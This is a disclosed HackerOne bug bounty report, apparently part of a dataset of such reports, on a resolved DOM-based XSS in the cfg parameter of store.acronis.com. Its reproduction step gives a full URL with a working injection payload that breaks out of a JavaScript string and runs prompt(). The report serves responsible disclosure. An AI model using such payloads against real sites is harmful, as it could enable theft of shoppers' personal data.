---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '968690'
original_report_id: '968690'
title: DOM based XSS in store.acronis.com/<id>/purl-corporate-standard-IT [cfg parameter]
team_handle: acronis
created_at: '2020-08-27T13:56:01.730Z'
disclosed_at: '2020-10-20T14:37:52.054Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 17
asset_identifier: '*.acronis.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
---

# DOM based XSS in store.acronis.com/<id>/purl-corporate-standard-IT [cfg parameter]

## Metadata

- HackerOne Report ID: 968690
- Weakness: 
- Program: acronis
- Disclosed At: 2020-10-20T14:37:52.054Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary
Hi Acronis team, i found a DOM based XSS in store.acronis.com, this vulnerability arise from a missing escape for the \ character.

## Steps To Reproduce

  1. go to: https://store.acronis.com/837/purl-corporate-standard-IT?cart=201591&deliveryEmail=f_m%2B5%40wearehackerone.com&deliveryFirstname=fmfm&deliveryEmailRetype=f_m%2B5%40wearehackerone.com&deliveryPhone1=fmfm&deliveryLastname=fmfmfm&x-uid=%22%3e%3ctestxss&quantity_201591=1&recommendation=cloud_20off&recommendation=ACPPLP&x-page=https://www.acronis.com/it-it/business/backup/server/purchasing/&tracking=&x-segment=corporate&cfg=\\ciao%27}];prompt();var%20asd=[{%27foo%27:%27bar
  2. a prompt appear

{F965980}

## Impact
since it's in the store subdomain, this can lead to PII stealing

## Recommendations
escape the \ character in \\

## Impact

since it's in the store subdomain, this can lead to PII stealing

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
